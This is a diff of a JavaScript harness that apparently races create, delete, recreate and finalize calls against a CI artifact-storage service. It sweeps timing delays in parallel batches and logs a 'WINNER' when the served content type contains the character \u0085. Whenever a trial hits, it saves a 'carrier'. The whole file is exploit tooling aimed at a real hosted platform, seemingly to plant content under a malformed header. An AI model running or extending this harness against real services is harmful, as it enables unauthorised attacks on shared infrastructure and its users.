@@ -86,25 +86,8 @@ async function putCarrier(urls, id) {
   return repository;
 }
 
-async function pendingTrial(index, firstVersion) {
-  const name = `pending-${process.env.GITHUB_RUN_ID}-${firstVersion}-${index}`;
-  const first = await create(name, firstVersion);
-  await upload(first.url);
-  const deleted = await del(name);
-  const second = await create(name, firstVersion === 7 ? 6 : 7);
-  await upload(second.url);
-  const final = await finalize(name);
-  const view = await inspect(name);
-  const row = {kind: 'pending', index, firstVersion, first, deleted, second, final, view};
-  if (view.rsct?.includes('\u0085') && final.id) {
-    row.repository = await putCarrier([first.url, second.url], final.id);
-    console.log(`WINNER ${JSON.stringify(row)}`);
-  }
-  return row;
-}
-
 async function finalizedTrial(index, firstVersion, delay) {
-  const name = `finalized-${process.env.GITHUB_RUN_ID}-${firstVersion}-${delay + 30}-${index}`;
+  const name = `finalized-${process.env.GITHUB_RUN_ID}-${firstVersion}-${delay + 100}-${index}`;
   const first = await create(name, firstVersion);
   await upload(first.url);
   const oldFinal = await finalize(name);
@@ -124,7 +107,7 @@ async function finalizedTrial(index, firstVersion, delay) {
   const final = await finalize(name);
   const view = await inspect(name);
   const row = {kind: 'finalized', index, firstVersion, delay, first, oldFinal, deleted, second, final, view};
-  if (view.rsct?.includes('\u0085') && (final.id || oldFinal.id)) {
+  if (view.rsct && view.rsct.includes('\u0085') && (final.id || oldFinal.id)) {
     const id = final.id || oldFinal.id;
     row.repository = await putCarrier([first.url, second.url], id);
     console.log(`WINNER ${JSON.stringify(row)}`);
@@ -132,25 +115,22 @@ async function finalizedTrial(index, firstVersion, delay) {
   return row;
 }
 
+const DELAYS = [-60,-45,-35,-28,-22,-18,-14,-11,-8,-6,-4,-2,0,2,4,6,8,11,14,18,22,28,35,45,60];
 const trials = [];
-for (let i = 0; i < 8; i++) {
-  trials.push(() => pendingTrial(i, i % 2 ? 7 : 6));
-  for (const delay of [-20, 0, 20]) {
+for (let i = 0; i < 6; i++) {
+  for (const delay of DELAYS) {
     trials.push(() => finalizedTrial(i, i % 2 ? 7 : 6, delay));
   }
 }
 const rows = [];
-for (let i = 0; i < trials.length; i += 8) {
-  rows.push(...await Promise.all(trials.slice(i, i + 8).map(fn => fn())));
+for (let i = 0; i < trials.length; i += 10) {
+  rows.push(...await Promise.all(trials.slice(i, i + 10).map(fn => fn().catch(e => ({view: {ok: false, error: String(e).slice(0,120)}})))));
 }
 const summary = {
   total: rows.length,
-  odd: rows.filter(x => x.view?.rsct?.includes('\u0085')).length,
-  json: rows.filter(x => x.view?.rsct === 'application/json').length,
-  zip: rows.filter(x => x.view?.rsct === 'application/zip').length,
-  missing: rows.filter(x => !x.view?.ok).length,
-  pending: rows.filter(x => x.kind === 'pending').map(x => ({
-    firstVersion: x.firstVersion, deleted: x.deleted, second: x.second, final: x.final, view: x.view,
-  })),
+  odd: rows.filter(x => x.view && x.view.rsct && x.view.rsct.includes('\u0085')).length,
+  json: rows.filter(x => x.view && x.view.rsct === 'application/json').length,
+  zip: rows.filter(x => x.view && x.view.rsct === 'application/zip').length,
+  missing: rows.filter(x => !x.view || !x.view.ok).length,
 };
 console.log(`DELETE_SUMMARY ${JSON.stringify(summary)}`);
